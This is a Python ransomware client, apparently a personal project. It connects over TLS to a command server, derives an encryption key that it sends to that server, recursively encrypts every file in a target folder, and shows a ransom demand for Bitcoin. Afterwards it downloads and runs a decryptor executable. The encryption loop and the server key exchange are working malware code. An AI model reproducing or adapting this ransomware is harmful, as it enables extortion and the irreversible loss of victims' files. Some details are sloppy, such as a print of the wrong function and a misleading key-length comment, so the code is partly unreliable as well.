import os
import socket
import ssl
from cryptography.fernet import Fernet
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.backends import default_backend
import base64
import os
import tkinter as tk
from tkinter import messagebox
import subprocess
HOST = socket.gethostbyname(socket.gethostname())
PORT = 8443
def create_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    return sock
def wrap_socket(sock):
    context = ssl.create_default_context(ssl.Purpose.SERVER_AUTH)
    context.load_verify_locations(cafile=r"C:\Users\LiorCohen\OneDrive - fun flex ltd\משפחה\יהלי כהן\Projects\SigmaProject\Server Side\cert.pem")  
    context.check_hostname = False
    ssl_socket = context.wrap_socket(sock, server_hostname="localhost")
    return ssl_socket
def encrypt_files_in_directory(directory_path, f):
    all_filenames = os.listdir(directory_path)
    for filename in all_filenames:
        file_path = os.path.join(directory_path, filename)
        if os.path.isfile(file_path):
            encrypt_file(file_path, f)
            print(f"Encrypted file: {file_path}")
        else:
            encrypt_files_in_directory(file_path, f)
def read_file_data(file_path):
    file = open(file_path, 'rb')
    data = file.read()
    file.close()
    return data
def encrypt_data(plaintext, f):
    ciphertext = f.encrypt(plaintext)
    return ciphertext
def encrypt_file(file_path, f):
    data = read_file_data(file_path)
    encrypted_data = encrypt_data(data, f)
    file = open(file_path, 'wb')
    file.write(encrypted_data)
    file.close()
    return encrypted_data
def derive_key_from_password(password: str, salt: bytes) -> bytes:
    """
    Derives a cryptographic key from a password using PBKDF2HMAC.

    Args:
        password: The password or passphrase as a string.
        salt: A unique, random salt (should be stored alongside the encrypted data).

    Returns:
        The derived cryptographic key as bytes.
    """
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA1(),
        length=32,  # Desired key length in bytes (e.g., 32 for AES256)
        salt=salt,
        iterations=480000,  # Number of iterations, adjust for security/performance
        backend=default_backend()
    )
    key = kdf.derive(password.encode('utf-8'))
    return base64.urlsafe_b64encode(key) # Fernet keys need to be url-safe base64 encoded
def decrypt_data(ciphertext, f):
    plaintext = f.decrypt(ciphertext)
    return plaintext
def decrypt_file(file_path, f):
    encrypted_data = read_file_data(file_path)
    print(encrypt_data)
    decrypted_data = decrypt_data(encrypted_data, f)
    file = open(file_path, 'wb')
    file.write(decrypted_data)
    file.close()
    return decrypted_data
def generate_key(password_text):
    salt = os.urandom(16) 
    encryption_key = derive_key_from_password(password_text, salt)
    return encryption_key
def sent_key(encryption_key, client_socket):
    client_socket.send(encryption_key)
def recieve_decryptor_exe(client_socket):
    with open("test_folder\\decrypt_folders.exe", "wb") as f:
        while True:
            data = client_socket.recv(4096)
            if not data:
                break
            f.write(data)
    return "test_folder\\decrypt_folders.exe"
def run_decryptor(command):
    subprocess.run([command])
def main():
    client_socket = create_socket()
    client_socket = wrap_socket(client_socket)
    client_socket.connect((HOST, PORT))
    password_text = client_socket.recv(1024)
    print(f'Received: {password_text.decode()}')
    encryption_key = generate_key(password_text.decode())
    sent_key(encryption_key, client_socket)
    path = r"C:\Users\LiorCohen\OneDrive - fun flex ltd\משפחה\יהלי כהן\Projects\SigmaProject\\test_folder"
    f = Fernet(encryption_key)
    encrypt_files_in_directory(path, f)
    print(f"Generated Encryption Key: {encryption_key.decode()}")
    messagebox.showinfo("Information:(Run: decrypt_folders.exe)", "Your files have been encrypted! You are cooked! Sent the money to get the decryption key!(1000000$ BTC) to this wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa")
    encryption_key = client_socket.recv(1024).decode()
    print(f'Received Decryption Key: {encryption_key}')
    root = tk.Tk()
    root.withdraw()
    messagebox.showinfo("Information:(Run: decrypt_folders.exe)", "Money Got Thanks Victim(: Here your encryption key:    " + encryption_key)
    command = recieve_decryptor_exe(client_socket)
    run_decryptor(command)
    client_socket.close()
if __name__ == '__main__':
    main()
    